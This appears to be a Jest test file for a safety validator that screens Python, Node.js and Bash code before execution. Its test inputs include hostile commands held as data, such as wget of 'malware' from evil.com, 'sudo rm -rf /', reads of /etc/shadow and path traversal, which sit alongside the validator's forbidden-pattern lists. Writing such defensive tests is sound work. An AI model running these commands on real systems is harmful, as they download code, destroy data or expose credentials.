/**
 * Code Safety Validator Tests
 *
 * Tests for dangerous pattern detection, language-specific validation,
 * safe code acceptance, edge cases, quick checks, and report formatting.
 */

import {
  validateCode,
  quickSafetyCheck,
  formatSafetyReport,
  PYTHON_FORBIDDEN_PATTERNS,
  NODEJS_FORBIDDEN_PATTERNS,
  BASH_FORBIDDEN_PATTERNS,
} from '../../../services/code-execution/safety-validator';

// ===========================================
// Tests
// ===========================================

describe('SafetyValidator', () => {
  // -------------------------------------------
  // Python Validation
  // -------------------------------------------

  describe('Python: forbidden imports', () => {
    it('should reject import os', () => {
      const result = validateCode('import os\nos.system("ls")', 'python');
      expect(result.safe).toBe(false);
      expect(result.violations.some(v => v.type === 'forbidden_import')).toBe(true);
    });

    it('should reject from os import path', () => {
      const result = validateCode('from os import path', 'python');
      expect(result.safe).toBe(false);
    });

    it('should reject import subprocess', () => {
      const result = validateCode('import subprocess\nsubprocess.run(["ls"])', 'python');
      expect(result.safe).toBe(false);
      expect(result.violations.some(v => v.type === 'process_spawn')).toBe(true);
    });

    it('should reject import socket (network)', () => {
      const result = validateCode('import socket', 'python');
      expect(result.safe).toBe(false);
      expect(result.violations.some(v => v.type === 'network_access')).toBe(true);
    });

    it('should reject import requests', () => {
      const result = validateCode('import requests\nrequests.get("http://evil.com")', 'python');
      expect(result.safe).toBe(false);
    });

    it('should reject import pickle (deserialization attacks)', () => {
      const result = validateCode('import pickle', 'python');
      expect(result.safe).toBe(false);
      expect(result.violations.some(v => v.type === 'code_injection')).toBe(true);
    });
  });

  describe('Python: code injection', () => {
    it('should reject eval()', () => {
      const result = validateCode('eval("2+2")', 'python');
      expect(result.safe).toBe(false);
      expect(result.violations.some(v => v.type === 'code_injection')).toBe(true);
    });

    it('should reject exec()', () => {
      const result = validateCode('exec("print(1)")', 'python');
      expect(result.safe).toBe(false);
    });

    it('should reject __import__()', () => {
      const result = validateCode('__import__("os")', 'python');
      expect(result.safe).toBe(false);
    });

    it('should reject __builtins__ access', () => {
      const result = validateCode('__builtins__.__import__("os")', 'python');
      expect(result.safe).toBe(false);
    });

    it('should reject importlib (dynamic import bypass)', () => {
      const result = validateCode('import importlib\nimportlib.import_module("os")', 'python');
      expect(result.safe).toBe(false);
    });
  });

  describe('Python: path traversal', () => {
    it('should reject ../ patterns', () => {
      const result = validateCode('open("../../etc/passwd")', 'python');
      expect(result.safe).toBe(false);
      expect(result.violations.some(v => v.type === 'path_traversal')).toBe(true);
    });

    it('should reject ~/ home directory access', () => {
      const result = validateCode('open("~/secrets.txt")', 'python');
      expect(result.safe).toBe(false);
    });
  });

  describe('Python: file access', () => {
    it('should reject file access outside /tmp', () => {
      const result = validateCode('open("/etc/passwd", "r")', 'python');
      expect(result.safe).toBe(false);
      expect(result.violations.some(v => v.type === 'file_system_access')).toBe(true);
    });

    it('should reject import shutil', () => {
      const result = validateCode('import shutil', 'python');
      expect(result.safe).toBe(false);
    });
  });

  describe('Python: environment access', () => {
    it('should reject os.environ', () => {
      const result = validateCode('import os\nprint(os.environ)', 'python');
      expect(result.safe).toBe(false);
      expect(result.violations.some(v => v.type === 'environment_access')).toBe(true);
    });
  });

  describe('Python: warnings', () => {
    it('should warn on while True', () => {
      const result = validateCode('while True:\n  pass', 'python');
      expect(result.warnings.some(w => w.type === 'infinite_loop_risk')).toBe(true);
    });

    it('should warn on very large range', () => {
      const result = validateCode('for i in range(10000000):\n  pass', 'python');
      expect(result.warnings.some(w => w.type === 'resource_intensive')).toBe(true);
    });
  });

  describe('Python: safe code', () => {
    it('should accept safe mathematical code', () => {
      const result = validateCode('import math\nprint(math.sqrt(16))', 'python');
      expect(result.safe).toBe(true);
      expect(result.score).toBeGreaterThan(80);
    });

    it('should accept safe string manipulation', () => {
      const result = validateCode('name = "hello"\nprint(name.upper())', 'python');
      expect(result.safe).toBe(true);
      expect(result.violations).toHaveLength(0);
    });

    it('should accept safe json usage', () => {
      const result = validateCode('import json\ndata = json.loads(\'{"a": 1}\')\nprint(data)', 'python');
      expect(result.safe).toBe(true);
    });
  });

  // -------------------------------------------
  // Node.js Validation
  // -------------------------------------------

  describe('Node.js: forbidden requires', () => {
    it('should reject require child_process', () => {
      const result = validateCode('const cp = require("child_process")', 'nodejs');
      expect(result.safe).toBe(false);
      expect(result.violations.some(v => v.type === 'process_spawn')).toBe(true);
    });

    it('should reject require net', () => {
      const result = validateCode('const net = require("net")', 'nodejs');
      expect(result.safe).toBe(false);
      expect(result.violations.some(v => v.type === 'network_access')).toBe(true);
    });

    it('should reject require http', () => {
      const result = validateCode('const http = require("http")', 'nodejs');
      expect(result.safe).toBe(false);
    });

    it('should reject ESM import of fs', () => {
      const result = validateCode('import fs from "fs"', 'nodejs');
      expect(result.safe).toBe(false);
      expect(result.violations.some(v => v.type === 'file_system_access')).toBe(true);
    });

    it('should reject ESM import of child_process', () => {
      const result = validateCode('import { exec } from "child_process"', 'nodejs');
      expect(result.safe).toBe(false);
    });

    it('should reject dynamic import()', () => {
      const result = validateCode('const m = await import("fs")', 'nodejs');
      expect(result.safe).toBe(false);
      expect(result.violations.some(v => v.type === 'code_injection')).toBe(true);
    });
  });

  describe('Node.js: code injection', () => {
    it('should reject eval()', () => {
      const result = validateCode('eval("process.exit(1)")', 'nodejs');
      expect(result.safe).toBe(false);
    });

    it('should reject Function constructor', () => {
      const result = validateCode('const fn = new Function("return 1")', 'nodejs');
      expect(result.safe).toBe(false);
    });

    it('should reject vm module', () => {
      const result = validateCode('const vm = require("vm")', 'nodejs');
      expect(result.safe).toBe(false);
    });
  });

  describe('Node.js: environment and process', () => {
    it('should reject process.env', () => {
      const result = validateCode('console.log(process.env.SECRET)', 'nodejs');
      expect(result.safe).toBe(false);
      expect(result.violations.some(v => v.type === 'environment_access')).toBe(true);
    });

    it('should reject process.exit', () => {
      const result = validateCode('process.exit(0)', 'nodejs');
      expect(result.safe).toBe(false);
    });

    it('should reject process.kill', () => {
      const result = validateCode('process.kill(1234)', 'nodejs');
      expect(result.safe).toBe(false);
    });
  });

  describe('Node.js: network', () => {
    it('should reject fetch()', () => {
      const result = validateCode('fetch("https://evil.com")', 'nodejs');
      expect(result.safe).toBe(false);
      expect(result.violations.some(v => v.type === 'network_access')).toBe(true);
    });
  });

  describe('Node.js: safe code', () => {
    it('should accept basic console.log', () => {
      const result = validateCode('console.log("Hello World")', 'nodejs');
      expect(result.safe).toBe(true);
      expect(result.score).toBe(100);
    });

    it('should accept safe array operations', () => {
      const result = validateCode('const arr = [3, 1, 2];\nconsole.log(arr.sort());', 'nodejs');
      expect(result.safe).toBe(true);
    });
  });

  // -------------------------------------------
  // Bash Validation
  // -------------------------------------------

  describe('Bash: network commands', () => {
    it('should reject curl', () => {
      const result = validateCode('curl http://evil.com', 'bash');
      expect(result.safe).toBe(false);
      expect(result.violations.some(v => v.type === 'network_access')).toBe(true);
    });

    it('should reject wget', () => {
      const result = validateCode('wget http://evil.com/malware', 'bash');
      expect(result.safe).toBe(false);
    });

    it('should reject ssh', () => {
      const result = validateCode('ssh root@server.com', 'bash');
      expect(result.safe).toBe(false);
    });
  });

  describe('Bash: privilege escalation', () => {
    it('should reject sudo', () => {
      const result = validateCode('sudo rm -rf /', 'bash');
      expect(result.safe).toBe(false);
      expect(result.violations.some(v => v.type === 'privilege_escalation')).toBe(true);
    });

    it('should reject chmod', () => {
      const result = validateCode('chmod 777 /tmp/file', 'bash');
      expect(result.safe).toBe(false);
    });
  });

  describe('Bash: dangerous file operations', () => {
    it('should reject rm -rf /', () => {
      const result = validateCode('rm -rf /', 'bash');
      expect(result.safe).toBe(false);
    });

    it('should reject writing outside /tmp', () => {
      const result = validateCode('echo "data" > /etc/passwd', 'bash');
      expect(result.safe).toBe(false);
    });

    it('should reject access to /etc', () => {
      const result = validateCode('cat /etc/shadow', 'bash');
      expect(result.safe).toBe(false);
    });

    it('should reject access to /home', () => {
      const result = validateCode('ls /home/user', 'bash');
      expect(result.safe).toBe(false);
    });
  });

  describe('Bash: code injection', () => {
    it('should reject $() command substitution', () => {
      const result = validateCode('echo $(whoami)', 'bash');
      expect(result.safe).toBe(false);
      expect(result.violations.some(v => v.type === 'code_injection')).toBe(true);
    });

    it('should reject backtick substitution', () => {
      const result = validateCode('echo `whoami`', 'bash');
      expect(result.safe).toBe(false);
    });

    it('should reject eval', () => {
      const result = validateCode('eval "rm -rf /"', 'bash');
      expect(result.safe).toBe(false);
    });
  });

  // -------------------------------------------
  // Edge Cases
  // -------------------------------------------

  describe('Edge cases', () => {
    it('should accept empty code', () => {
      const result = validateCode('', 'python');
      expect(result.safe).toBe(true);
      expect(result.score).toBe(100);
    });

    it('should accept whitespace-only code', () => {
      const result = validateCode('   \n  \n  ', 'python');
      expect(result.safe).toBe(true);
      expect(result.score).toBe(100);
    });

    it('should reject code exceeding MAX_CODE_LENGTH', () => {
      const longCode = 'x = 1\n'.repeat(5000);
      const result = validateCode(longCode, 'python');
      expect(result.safe).toBe(false);
      expect(result.violations[0].type).toBe('code_injection');
      expect(result.score).toBe(0);
    });

    it('should warn on code with over 500 lines', () => {
      const code = Array(501).fill('x = 1').join('\n');
      const result = validateCode(code, 'python');
      expect(result.warnings.some(w => w.type === 'high_complexity')).toBe(true);
    });

    it('should include line numbers in violations', () => {
      const code = 'x = 1\ny = 2\nimport os\nz = 3';
      const result = validateCode(code, 'python');
      const osViolation = result.violations.find(v => v.message.includes('os'));
      expect(osViolation).toBeDefined();
      expect(osViolation?.line).toBe(3);
    });

    it('should include code snippet in violations', () => {
      const code = 'import subprocess';
      const result = validateCode(code, 'python');
      expect(result.violations[0].snippet).toContain('subprocess');
    });
  });

  // -------------------------------------------
  // Score Calculation
  // -------------------------------------------

  describe('Score calculation', () => {
    it('should give score 100 for safe code', () => {
      const result = validateCode('print("hello")', 'python');
      expect(result.score).toBe(100);
    });

    it('should decrease score for violations', () => {
      const result = validateCode('import os', 'python');
      expect(result.score).toBeLessThan(100);
    });

    it('should decrease score for warnings', () => {
      const result = validateCode('while True:\n  pass', 'python');
      expect(result.score).toBeLessThan(100);
    });

    it('should floor score at 0', () => {
      // Multiple critical violations
      const code = 'import os\nimport subprocess\nimport socket\neval("x")\nexec("y")';
      const result = validateCode(code, 'python');
      expect(result.score).toBeGreaterThanOrEqual(0);
    });
  });

  // -------------------------------------------
  // Quick Safety Check
  // -------------------------------------------

  describe('quickSafetyCheck', () => {
    it('should return true for safe code', () => {
      expect(quickSafetyCheck('print("hello")', 'python')).toBe(true);
    });

    it('should return false for critical violations', () => {
      expect(quickSafetyCheck('import os', 'python')).toBe(false);
    });

    it('should return true for empty code', () => {
      expect(quickSafetyCheck('', 'python')).toBe(true);
    });

    it('should return false for code exceeding max length', () => {
      const longCode = 'x = 1\n'.repeat(5000);
      expect(quickSafetyCheck(longCode, 'python')).toBe(false);
    });

    it('should not flag medium-severity patterns', () => {
      // getattr with string literal is medium severity - should pass quick check
      // but threading is also medium - quick check only checks critical
      const result = quickSafetyCheck('import threading', 'python');
      // threading is medium severity, so quick check should pass
      expect(result).toBe(true);
    });
  });

  // -------------------------------------------
  // Safety Report Formatting
  // -------------------------------------------

  describe('formatSafetyReport', () => {
    it('should format passing report', () => {
      const result = validateCode('print("hello")', 'python');
      const report = formatSafetyReport(result);
      expect(report).toContain('passed');
      expect(report).toContain('100');
    });

    it('should format failing report with violations', () => {
      const result = validateCode('import os', 'python');
      const report = formatSafetyReport(result);
      expect(report).toContain('FAILED');
      expect(report).toContain('Violations');
      expect(report).toContain('forbidden_import');
    });

    it('should include warnings in report', () => {
      const result = validateCode('while True:\n  pass', 'python');
      const report = formatSafetyReport(result);
      expect(report).toContain('Warnings');
      expect(report).toContain('infinite_loop_risk');
    });

    it('should include line numbers in violation report', () => {
      const result = validateCode('x = 1\nimport os', 'python');
      const report = formatSafetyReport(result);
      expect(report).toContain('line 2');
    });
  });

  // -------------------------------------------
  // Pattern Registry Integrity
  // -------------------------------------------

  describe('Pattern registry', () => {
    it('should have Python patterns', () => {
      expect(PYTHON_FORBIDDEN_PATTERNS.length).toBeGreaterThan(20);
    });

    it('should have Node.js patterns', () => {
      expect(NODEJS_FORBIDDEN_PATTERNS.length).toBeGreaterThan(15);
    });

    it('should have Bash patterns', () => {
      expect(BASH_FORBIDDEN_PATTERNS.length).toBeGreaterThan(15);
    });

    it('should have valid pattern types', () => {
      const validTypes = [
        'forbidden_import', 'dangerous_function', 'file_system_access',
        'network_access', 'process_spawn', 'code_injection',
        'path_traversal', 'environment_access', 'privilege_escalation',
      ];
      for (const pattern of PYTHON_FORBIDDEN_PATTERNS) {
        expect(validTypes).toContain(pattern.type);
      }
    });
  });
});
